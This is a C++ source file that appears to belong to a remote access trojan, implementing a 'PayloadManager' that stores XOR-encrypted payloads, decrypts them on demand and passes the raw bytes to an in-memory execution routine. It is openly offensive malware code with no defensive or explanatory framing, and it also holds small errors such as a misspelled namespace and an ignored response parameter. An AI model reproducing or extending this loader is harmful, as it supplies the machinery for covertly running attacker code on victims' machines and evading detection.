#include "rat/payload/PayloadManager.hpp"
#include "rat/payload/rawdogger.hpp"
#include <cstdint>
#include <fstream>
#include <string>
#include <vector>
#include <unordered_map>
#include <filesystem>
#include <random>
#include <sstream>

#include "rat/system.hpp"
#include "rat/encryption/encryption.hpp"

#ifdef WIN32
  #define strdup(string) _strdup(string)
#endif

namespace rat::payload {

PayloadManager::PayloadManager(const std::string& Xor_Key)
{
    this->xor_key = strdup(Xor_Key.c_str());
    this->xor_key_length = Xor_Key.size(); // length without \0
    this->payloads_map = {};

}

PayloadManager::~PayloadManager() {
    if (this->xor_key) {
        free(this->xor_key);
    }
}

void PayloadManager::setCacheDir(const std::filesystem::path& Dir_Path) {
    if(std::filesystem::is_directory(Dir_Path)) {
      this->cache_dir = Dir_Path;
    }
}

// Load a payload
bool PayloadManager::load(const std::string& arg_Key, std::vector<uint8_t>& arg_Payload) {
    try {
        this->payloads_map[arg_Key] = arg_Payload;
        return true;
    } catch(...) {
        return false;
    }
}

// Unload a payload by key
bool PayloadManager::unload(const std::string& arg_Key) {
    auto it = this->payloads_map.find(arg_Key);
    if (it != this->payloads_map.end()) {
        /*This destroys the map*/
        this->payloads_map.erase(it);
        return true;
    }
    return false;
}

// Reset all payloads
void PayloadManager::reset() {
    this->payloads_map.clear();
}

// Execute a payload
bool PayloadManager::execute(const std::string& arg_Key,
                             const std::vector<std::string>& arg_Parameters,
                             std::string& Response_Buffer)  {
    auto it = this->payloads_map.find(arg_Key);
    if (it == this->payloads_map.end()) {
        return false; // key not found
    }
    std::vector<uint8_t> code_buffer = it->second;
  
    rat::encryption::xorData(code_buffer.data(),code_buffer.size(),  this->xor_key);
    std::string response_buffer;
    return paylaod::rawdogger::rawByteExecute(code_buffer.data(), code_buffer.size(), {}, response_buffer);

}
} // namespace rat::payload
